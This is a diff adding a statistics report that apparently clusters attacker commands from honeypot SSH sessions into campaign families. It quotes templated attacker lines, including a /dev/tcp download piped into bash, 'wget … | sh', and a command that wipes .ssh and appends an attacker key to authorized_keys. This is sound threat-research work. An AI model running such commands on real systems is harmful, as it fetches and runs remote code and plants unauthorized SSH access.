@@ -1,0 +1,24 @@
+
+artefact events removed: {'substitution': 90250, 'passwd_echo': 2338}
+sessions with >= 1 input line: 215,833
+label      campaign |  k  sessions  sequences>=5  families>=5
+exact       164,046 |  3       977             6            4
+exact       164,046 |  4       886             5            4
+exact       164,046 |  5       886             5            4
+template    186,686 |  3    14,142            67            9
+template    186,686 |  4    14,051            66            9
+template    186,686 |  5    13,976            64            8
+unattributed after templating with >= 3 lines: 2,781 sessions
+
+template campaign families reaching line 3: 9
+  c6da0f07a0a0ce9f sequences= 56 sessions=13,142  cd ~; chattr -ia .ssh; lockr -ia .ssh
+  bb5c89b25f7d0899 sequences=  2 sessions=   861  /ip cloud print
+  17f7aa85e15f8882 sequences=  1 sessions=    55  nohup bash -c "exec <N><>/dev/tcp/<IP>/<N> && echo -n 'GET /linux' >&<N> && cat <N><&<N> >
+  9376adfde5675c23 sequences=  2 sessions=    27  echo <N> > /dev/null && cat /bin/echo
+  2197f7c27afb7905 sequences=  2 sessions=    26  echo <N> && cat /bin/echo
+  a103d79c46716c12 sequences=  1 sessions=    13  uname -a
+  4e9a6730bdcfc139 sequences=  1 sessions=     7  cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa <TOK> mdrfckr">>.ssh/authorized_keys &&
+  0fe94649204f3edc sequences=  1 sessions=     6  wget -qO - <URL> | sh > /dev/null <N>>&<N> &
+  40551335b0e48a5d sequences=  1 sessions=     5  cat /bin/echo
+
+[+] reports/diagnostics/template_sessions.csv  template_sequences.csv  template_summary.json
